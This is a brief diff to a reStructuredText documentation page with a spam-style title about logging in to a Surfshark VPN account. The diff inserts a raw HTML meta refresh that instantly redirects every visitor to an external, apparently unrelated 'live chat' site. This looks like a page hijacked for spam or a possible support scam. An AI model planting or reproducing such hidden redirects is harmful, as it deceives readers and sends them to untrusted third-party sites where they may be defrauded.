@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://accuratelivechat.com/">
+
+
 How Do I Log In to My Surfshark VPN Account Quickly Guide?  
 ============================================
 
